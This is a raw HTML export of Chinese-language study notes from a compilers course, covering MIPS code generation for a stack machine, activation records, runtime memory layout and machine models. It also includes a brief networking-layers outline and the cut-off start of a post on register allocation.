class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(e1 + e2) = <br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>cgen(e2)<br><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t1</span> <span class="hljs-number">4</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">t1</span> $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>其实也就是输出对应的汇编代码</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dart">cgen(e1 + e2) = <br>cgen(e1)<br>cout &lt;&lt; <span class="hljs-string">&#x27;sw <span class="hljs-subst">$a0</span> 0(<span class="hljs-subst">$sp</span>)&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;addiu <span class="hljs-subst">$sp</span> <span class="hljs-subst">$sp</span> -4;&#x27;</span><br>cgen(e2)<br>cout &lt;&lt; <span class="hljs-string">&#x27;lw <span class="hljs-subst">$t1</span> 4(<span class="hljs-subst">$sp</span>)&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;add <span class="hljs-subst">$a0</span> <span class="hljs-subst">$t1</span> <span class="hljs-subst">$a0</span>&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;addiu <span class="hljs-subst">$a0</span> <span class="hljs-subst">$sp</span> 4&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li>上面为+生成汇编代码的过程，可以理解为是一个模板，其中cgen(e1)和cgen(e2)就是插槽</li><li>代码生成是递归的，e1和e2也可继续向下生成代码</li><li>代码生成可以是沿着AST自顶向下递归的，至少对于表达式是可以的</li></ul><p>下面看一个函数的例子，函数有调用和函数定义两部分，这两者都依赖于AR(Activerecord or function frame)</p><p>简单的栈zhen满足如下规则即可：</p><ul><li>结果总是存储在<code>$a0</code>中，比如两者之和就可以存于<code>$a0</code> 中</li><li>栈zhen包含实际参数，也就是<code>f(x1, x2, ... xn)</code> 将会push<code>xn, ... x1</code> 入栈</li><li>在这个简单的例子只设计参数，不包含局部变量</li><li>另外，对于mips架构，需要在栈zhen内记录函数的返回地址</li><li>记录函数栈zhen起始地址：<code>fp</code></li><li>mips跳转指令：<code>jal label</code></li></ul><p>对于函数调用：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(f(e1, ... en)) = <br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">fp</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>cgen(en)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>...<br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br><span class="hljs-keyword">jal </span>f_entry<br></code></pre></td></tr></table></figure><ul><li>函数调用的时候，保存了fp</li><li>逆序保存了实际参数</li><li>函数跳转的时候，返回地址<code>$ra</code>是自动保存的，这是底层实现的，我们不用管</li><li>一个使用了多少空间：4*n + 4 bytes,n是参数个数，+4是一个<code>fp</code> 指针</li></ul><p>对于函数定义：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">cgen(def f(x1, ... xn) = e) = <br>move <span class="hljs-variable">$fp</span> <span class="hljs-variable">$sp</span> <span class="hljs-regexp">//</span> 新的函数起始地址<br><span class="hljs-variable">$w</span> <span class="hljs-variable">$ra</span> <span class="hljs-number">0</span>(<span class="hljs-variable">$sp</span>) <span class="hljs-regexp">//</span> 保存返回地址<br>addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> -<span class="hljs-number">4</span> <span class="hljs-regexp">//</span> 扩增<br>cgen(e) <span class="hljs-regexp">//</span> 递归生成e<br>lw <span class="hljs-variable">$ra</span> <span class="hljs-number">4</span>(<span class="hljs-variable">$sp</span>) <span class="hljs-regexp">//</span> 加载返回地址<br>addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> z <span class="hljs-regexp">//</span> 恢复栈空间<br>jal <span class="hljs-variable">$ra</span> <span class="hljs-regexp">//</span> 跳转回去<br></code></pre></td></tr></table></figure><ul><li>fp在高地址处</li><li>callee（被调用者）</li><li>z = 4 * n + 8，n是实际参数，8是<code>$ra</code> 和<code>$fp</code></li></ul><p>上面的实现方式可以实现简单函数：</p><ul><li>函数不存在局部变量，仅仅有参数</li><li>实际参数是caller push入栈的</li></ul><p>存在问题：计算的中间结果放在栈内，变量(参数)并不能基于$sp进行偏移量查询，因为不好确定使用了多少中间变量</p><p>解决方法：使用fp查询变量(参数)</p><ul><li>fp始终指向返回地址，这样不管栈怎么扩增，fp是不变的，我们可以始终基于fp查询变量（参数）</li></ul><p>xi表示第i个实际参数，那么关于xi的代码生成如下：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">cgen</span><span class="hljs-params">(xi)</span> = </span><br><span class="hljs-function"><span class="hljs-title">lw</span> $<span class="hljs-title">a0</span> <span class="hljs-title">z</span><span class="hljs-params">($fp)</span> <span class="hljs-params">(z = <span class="hljs-number">4</span> * i)</span></span><br></code></pre></td></tr></table></figure><p>🌰：<code>def f(x, y) = e</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[<br>old <span class="hljs-built_in">fp</span>,<br>y,<br>x,<br>return <span class="hljs-keyword">addr, </span>&lt;= <span class="hljs-built_in">fp</span><br>? &lt;= <span class="hljs-built_in">sp</span><br>]<br>X is <span class="hljs-built_in">at</span> <span class="hljs-built_in">fp</span> + <span class="hljs-number">4</span><br>Y is <span class="hljs-built_in">at</span> <span class="hljs-built_in">fp</span> + <span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><p>现实中的寄存器：</p><ul><li>尽量将值保存在寄存器中，因为更快</li><li>中间值是被设计在AR中，有着一定的排列方式，可以在后续章节中看到如何使用临时变量，并把临时变量存在AR中，而非一味地push和pop</li></ul><p>来看一个完整的例子：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">sumto</span>(<span class="hljs-variable">x</span>) = <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">x</span> = <span class="hljs-number">0</span> <span class="hljs-variable">then</span> <span class="hljs-number">0</span> <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-variable">x</span> + <span class="hljs-title">sumto</span>(<span class="hljs-variable">x</span> – <span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><p>为以上函数生成代码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#x in ra</span><br>sumto_entry:<br>move<span class="hljs-variable">$fp</span><span class="hljs-variable">$sp</span>#<span class="hljs-attribute">fp</span>=sp<br>sw<span class="hljs-variable">$ra</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=ra<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(sp+4)(a0=x)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>li<span class="hljs-variable">$a0</span>0#<span class="hljs-attribute">a0</span>=0<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(sp+4)(t1=a0=x)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>+4#sp+=4<br>beq<span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span>true1#<span class="hljs-keyword">if</span> <span class="hljs-attribute">a0</span>=t1, goto true1<br>false1:#x <span class="hljs-keyword">in</span> sp - 4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(4+fp)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>sw<span class="hljs-variable">$fp</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=fp<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(4+fp)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>li<span class="hljs-variable">$a0</span>1#<span class="hljs-attribute">a0</span>=1<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(4+sp)<br>sub<span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span><span class="hljs-variable">$a0</span>#<span class="hljs-attribute">a0</span>=t1-a0(a0=x-1)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>4#sp+=4<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>jalsumto_entry#goto sumto_entry<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(4+sp)<br><span class="hljs-built_in">add</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span><span class="hljs-variable">$a0</span>#<span class="hljs-attribute">a0</span>=t1+a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>4#sp+=4<br>jalendif1<br>true1:<br>li<span class="hljs-variable">$a0</span>0#<span class="hljs-attribute">a0</span>=0<br>endif1:#恢复调用前的状态<br>lw<span class="hljs-variable">$ra</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">ra</span>=*(4+sp)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>12#sp+=12<br>lw<span class="hljs-variable">$fp</span>0(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">fp</span>=*sp<br>jr<span class="hljs-variable">$ra</span>#goto<span class="hljs-built_in"> address </span><span class="hljs-keyword">in</span> ra<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>AR必须和代码生成器一同设计</li><li>代码生成可以通过遍历AST递归做到</li><li>推荐使用堆栈机生成代码，比较简单，大多数语言都是如此</li></ul><p>运行时组织：主要是为了组织运行时代码(狭义指运行时代码生成)</p><p>代码生成的目标：准确和快</p><p>代码生成的两个假设：</p><ul><li>代码执行是串行的，即从上至下一个语句接着一个语句按照既定的顺序执行</li><li>当程序被调用结束后，控制权应该交给执行本次调用的后一条语句</li></ul><p>当然有些语言违背了这两条假设，比如说并行</p><p>变量x的生命周期：变量x起作用的一段范围（生命周期是一个动态（运行时）概念，而作用域是一个静态概念）</p><h2 id="rutime-organization">Rutime Organization</h2><p>主要是组织代码生成的设计及相关计算模型，涉及以下内容：</p><ul><li>运行时的资源管理</li><li>存储管理</li><li>运行时的计算模型</li></ul><p>前面已经讲述三部分内容：</p><ul><li>Lexical analysis</li><li>parsing</li><li>semantic analysis</li></ul><p><strong>这三部分都是加强语言定义的方式</strong></p><p>程序的执行方式：</p><ol type="1"><li>OS为该程序分配空间</li><li>代码北加州到这部分空间</li><li>OS跳转到程序的入口</li></ol><p>程序的内存布局： <imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042401.jpg?raw=true"alt="img" /></p><p>如上，按照传统方式，程序的内存布局如下，上面图片是简化的，实际情况下内存不一定是连续的：</p><ul><li><p>顶部的低地址是代码段</p></li><li><p>底部的高地址</p></li></ul><p>代码生成的目标：</p><ul><li>生成正确的代码</li><li>生成的代码快</li></ul><p>传统意义上里生成的代码基于以下两个假设：</p><ul><li>执行是顺序的，控制流从程序中的一个位置按定义好的顺序移动到另一个位置。</li><li>调用过程时，控制流总是返回到调用后的位置。</li></ul><blockquote><p>当然有的程序语言违背了这两个假设，比如可并行运行的语言</p></blockquote><p><strong>程序的激活</strong></p><p>激活：对子程序P的调用，称之为对P的激活，P的激活的生命周期为执行P的所有步骤（变量x的生命周期是定义x的执行部分）</p><blockquote><p>生命周期是一个动态的运行时概念，而作用域是一个静态概念</p></blockquote><p>对于非并行程序，激活是线性的</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">Class</span> <span class="hljs-variable">Main</span> &#123;<br>    <span class="hljs-function"><span class="hljs-title">g</span>() : <span class="hljs-variable">Int</span> &#123; <span class="hljs-number">1</span> &#125;;</span><br><span class="hljs-function">    <span class="hljs-title">f</span>(<span class="hljs-variable">x</span>:<span class="hljs-variable">Int</span>): <span class="hljs-variable">Int</span> &#123; <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">x</span> = <span class="hljs-number">0</span> <span class="hljs-variable">then</span> <span class="hljs-title">g</span>() <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-title">f</span>(<span class="hljs-variable">x</span> - <span class="hljs-number">1</span>) <span class="hljs-variable">fi</span>&#125;; </span><br><span class="hljs-function">    <span class="hljs-title">main</span>(): <span class="hljs-variable">Int</span> &#123;&#123;<span class="hljs-title">f</span>(<span class="hljs-number">3</span>); &#125;&#125;;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>以上代码生成的激活记录如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">main -&gt; f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">3</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> g<br></code></pre></td></tr></table></figure><p>基于此，因此堆栈可以跟踪整个激活记录的过程</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042404.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><strong>激活记录（栈zhen）</strong></p><p>管理一个过程激活所需的信息称为激活记录（AR）或栈帧（frame）</p><p>如果过程F调用G，则G的激活记录包含F和G的混合信息。</p><ul><li>F被“暂停”，直到G完成，此时F恢复。</li><li>G的AR包含如下内容所需的信息<ul><li>完成G的执行</li><li>恢复执行F</li><li>G返回值的空间</li><li>实际参数</li><li>指向上一个激活记录的指针<ul><li>控制链接； 指向G的caller的AR</li></ul></li><li>调用G之前的机器状态<ul><li>寄存器和程序计数器的内容</li><li>局部变量</li></ul></li><li>其他临时值</li></ul></li><li>将返回值放在第一个栈帧中的优点是，调用方可以在与自己的帧相距固定偏移量的位置找到它；</li><li>这个组织没有什么特殊的地方<ul><li>可以重新排列栈帧元素的顺序；</li><li>可以不同地划分caller/call的职责；</li><li>如果组织能够提高执行速度或简化代码生成，那么它会更好。</li></ul></li><li>真正的编译器将尽可能多的栈帧保存在寄存器中<ul><li>特别是方法的结果和参数。</li></ul></li><li>编译器必须在编译时确定激活记录的布局，并生成可正确访问激活记录中位置的代码。</li><li>因此，AR布局和代码生成器必须一起设计！</li></ul><h2 id="全局变量和堆">全局变量和堆</h2><ul><li>所有对全局变量的引用都指向同一个对象<ul><li>所以无法在激活记录中存储全局变量，因为当前AR结束后，全局变量依旧存在</li></ul></li><li>因此需要为全局变量分配一次固定地址<ul><li>具有固定地址的变量是“静态分配的”。</li></ul></li><li>根据语言，可能还有其他静态分配的值</li></ul><p>动态分配的值不能存放在AR中，Bar值必须在foo的AR释放后依然存在，因为foo的调用者可能使用Bar。：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> <span class="hljs-comment">&#123; new Bar &#125;</span><br></code></pre></td></tr></table></figure><ul><li>具有动态分配数据的语言使用堆来存储动态数据。</li><li>代码区域包含目标代码<ul><li>对于许多语言，目标代码是固定大小和只读的。</li></ul></li><li>静态区域包含具有固定地址的数据（非代码）（例如，全局数据）<ul><li>固定大小，可能是可读或可写的。</li></ul></li><li>堆栈包含每个当前活动过程的AR<ul><li><strong>每个AR通常固定大小，并且包含局部变量。</strong></li></ul></li><li>堆包含所有其他数据<ul><li>在C中，堆由malloc和free管理。</li></ul></li><li>堆和堆栈都会增长</li><li>必须注意不要互相影响</li><li>解决方案：<ul><li>将堆和堆栈顶在内存的两端，然后让它们彼此靠近：</li></ul></li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042410.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="对齐">对齐</h2><p>大多数现代机器：32/64 bit</p><p>1 byte = 8 bits</p><p>1 word = 4 or 8 bytes</p><p>一般机器要么是按字节要么按字寻址</p><p>按字对齐：</p><p>example：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs axapta">[h e l l o ? ? ?][<span class="hljs-keyword">next</span> data]<br>add <span class="hljs-number">3</span> padding characters to the string<br><br>[<span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> ?    ?   ?]<br><span class="hljs-keyword">this</span>, word aligned <span class="hljs-keyword">if</span> <span class="hljs-keyword">next</span> data begin <span class="hljs-keyword">from</span> here,<br>      <span class="hljs-keyword">this</span>, not word aligned <span class="hljs-keyword">if</span> <span class="hljs-keyword">next</span> data begin <span class="hljs-keyword">from</span> here,<br></code></pre></td></tr></table></figure><h2 id="计算模型堆栈机寄存器">计算模型：堆栈机&amp;寄存器&amp;</h2><p>堆栈机唯一的存储就是堆栈</p><ul><li>指令 $ r = F(a_1, a_2, ..., a_n) $<ul><li>从堆栈中弹出n个操作数</li><li>使用操作数计算操作F</li><li>将结果r压入堆栈</li></ul></li><li>考虑如下两条指令<ul><li>push i: 将整数i堆入堆栈</li><li>add: 相加两个整数</li></ul></li></ul><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs none">push 1<br>push 2<br>push 3<br>add<br></code></pre></td></tr></table></figure><figure><imgsrc="https://upload-images.jianshu.io/upload_images/18574033-6cbe4fae0a21d2f2.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1090/format/webp"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>累加器机，英文为“AccumulatorMachine”，是一种寄存器，用来存储计算产生的中间结果。累加器机模型是一种古老的计算模型，仅能够支持单一值的累加寄存器单元，因此，基于累加器机模型设计的指令都只支持一个操作数</p><p>寄存器机，英文为 RegisterMachine，也译为暂存器机，这种计算模型的机器，使用特定的 CPU寄存器组，来作为指令执行过程中数据存储和交换的容器。</p><p>在寄存器中，由于每一条参与到数据交换和处理的指令，都需要显示地标记操作数所在的寄存器，相较于堆栈机和累加器机，指令更长，但也更加灵活。</p><p>堆栈机使用栈结构作为数据存储与交换的容器，由于其“先进后出”的特性，无法直接操作位于栈底的数据，因此，在特殊情况下，机器会使用额外的指令来进行栈数据的交换过程，从而损失一定的执行效率。但另一方面，堆栈机模型实现简单，指令代码长度适中。</p><p>累加器机由于只有一个累加器寄存器可用于存储数据，因此在指令的执行过程中，可能会频繁请求机器的线形内存，从而导致一定的性能损耗。但另一方面，该模型最多只能有一个操作数，因此对应的指令代码较为精简。</p><p>寄存器机内大多数与数据操作相关的指令，都需要在执行时指定目标寄存器，因此，指令代码的长度较长。寄存器机拥有更多的数据暂存容器，一方面，灵活的数据操作导致寄存器的分配和使用规则变得复杂，另一方面，在使用得当的情况下，同样的计算逻辑，基于寄存器机模型，可以生成更为高效的指令执行结构。</p><p>纯堆栈机和纯寄存器机之间有一个中间点：n寄存器堆栈机</p><p>从概念上讲，将纯堆栈机堆栈的前n个位置保留在寄存器中。当n=1的时候，该寄存器演变成了累加器机</p><ul><li><p>在纯堆栈机中</p><ul><li>一次add执行三次内存操作；</li><li>两次读取，一次写入堆栈。</li></ul></li><li><p>在1寄存器堆栈计算机中，add运算符只要使用如下方式即可：</p><ul><li>acc &lt;- acc + top_of_stack，acc即累加器寄存器</li></ul></li><li><p>考虑一个表达式op(e1,…,en)</p><ul><li>注意e1,…,en是子表达式。</li><li>对于每个ei(0&lt;i&lt;n)<ul><li>计算ei；</li><li>将结果压入堆栈。</li></ul></li><li>从堆栈中弹出n−1个值，计算op</li><li>将结果存储在累加器中。</li></ul></li><li><p>对表达式e求值后，累加器将保留e的值，并且堆栈剩余部分不变。</p></li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042413.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/06/03/%E5%9B%9B%E5%B1%82%EF%BC%9A%E6%AF%8F%E4%B8%80%E5%B1%82%E9%83%BD%E4%B8%BA%E4%B8%8A%E5%B1%82%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%8D%E5%8A%A1/"/>
    <url>/emocoder/2023/06/03/%E5%9B%9B%E5%B1%82%EF%BC%9A%E6%AF%8F%E4%B8%80%E5%B1%82%E9%83%BD%E4%B8%BA%E4%B8%8A%E5%B1%82%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>四层：每一层都为上层提供了服务</p><p>Application：双向可靠的字节流(using application-specificsemantics)</p><p>Transport: 保证了数据正确，有序，以及拥塞控制</p><p>Network: 不能保证数据的有序正确，不损坏，from ,to</p><p>Link: 节点之间的数据传播</p><p>IP：瘦身层，因为底层可以有很多（http, smtp, ssh,ftp），上层也是，比如网络层（tcp, rtp, udp），应用层（ethernet, wifi,dsl, sg）,但是网络层只有一种协议: IP</p><p>OSI7层标准</p><p>网络层（最重要）：主要是Internet protocol（IP）</p><p><strong>路由器：</strong></p><p>每个端口都有自己的mac地址</p><p>具有存储局部路由的功能</p><p>具有转发数据包的功能</p><p><strong>交换机：</strong></p><p>没有mac地址</p><p>只能存储全局的mac映射表，随着网络的接入，会越来越大</p><p>可以根据mac映射表，转发给指定主机</p><p><strong>集线器：</strong></p><p>为了解决只有电脑的简单网络时代的互联网之间的连接问题</p><p>没有mac地址，</p><p>没有存储任何表</p><p>仅仅通过广播寻找目的地址</p><p><ahref="https://blog.csdn.net/qq_44807642/article/details/103054914">(306条消息)【动图讲解】计算机网络之回退N步与选择重传_选择重传和回退n步_岳麓山下你和我的博客-CSDN博客</a></p><p>​</p><ul><li>Introduction<ul><li>引言</li><li>网络中的设计模式</li><li>字节顺序</li><li>IPv4</li><li>最长前缀匹配</li><li>地址解析协议</li><li>总结</li></ul></li><li>传输层协议<ul><li>TCP</li><li>UDP</li><li>端到端原则</li><li>错误检测</li><li>网络中的确定性有限状态机</li><li>停止等待协议</li><li>滑动窗口</li><li>可靠策略一(重传)</li><li>可靠策略二(TCPh header)</li><li>可靠策略一(连接与拆卸)</li><li>总结</li></ul></li><li>分组交换</li><li>拥塞控制</li><li>应用层协议</li><li>路由</li><li>物理层协议</li><li>网网络安全与加密</li><li>前沿话题</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 10 Register Allocation</title>
    <link href="/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81/"/>
    <url>/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81/</url>
    
    <content type="html"><![CDATA[<h2 id="引入">引入</h2><p>中间代码使用了无限制的临时变量</p><ul><li>简化了代码生成和优化</li><li>复杂了向汇编转换的过程</li></ul><p>实际情况寄存器是有限的，不能无限制的使用，所以在向汇编转换的时候使用有限的寄存器。</p><blockquote><p>Register allocation is as old as compilers</p><ul><li>Register allocation was used in the original FORTRAN compiler in the‘50s</li><li>Very crude algorithms</li></ul><p>A breakthrough came in 1980 – Register allocation scheme based ongraph coloring – Relatively simple, global and works well inpractice</p></blockquote><p><strong>思路：</strong></p><ul><li>将多个临时变量分配给同一个寄存器</li><li>同时不改变原来的语义</li></ul><p>考虑如下程序：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> := c + d<br>e := <span class="hljs-selector-tag">a</span> + <span class="hljs-selector-tag">b</span><br>f : = e - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>如果仅仅使用三个寄存器的话，这里假设a和e在使用完之后立马dead：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r2</span> + <span class="hljs-built_in">r3</span><br><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r1</span> + <span 